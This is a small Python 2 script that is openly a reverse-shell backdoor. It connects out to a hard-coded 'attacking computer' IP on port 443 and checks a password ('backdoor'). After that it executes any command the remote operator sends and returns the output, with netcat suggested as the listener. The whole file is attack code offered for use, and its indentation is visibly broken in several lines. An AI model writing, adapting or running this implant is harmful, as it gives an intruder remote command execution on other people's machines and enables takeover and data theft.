#!/usr/bin/python
import subprocess  #process commands
import socket      #process socket Data

host = "192.168.55.104"  #IP of Attacking Computer
port = 443              #port of Attacking Computer will listen on use netcat for the Listener
passwd = "backdoor"     #password for your Backdoor

#Check Password
def Login():
        global s
        s.send("Login: ")
        pwd = s.recv(1024)

       if pwd.strip() != passwd:
               Login()
       else:
              s.send("You Successfully hacked! and you got a shell have fun! #> ")
              Shell()

#Execute Shell Commands
def Shell():
        while True:
                data = s.recv(1024)

                if data.strip() == ":kill":  #kill program  with :kill
                        break

                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        output = proc.stdout.read() + proc.stderr.read()
                                        s.send(output)
                                        s.send("#> ")

#Start Script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
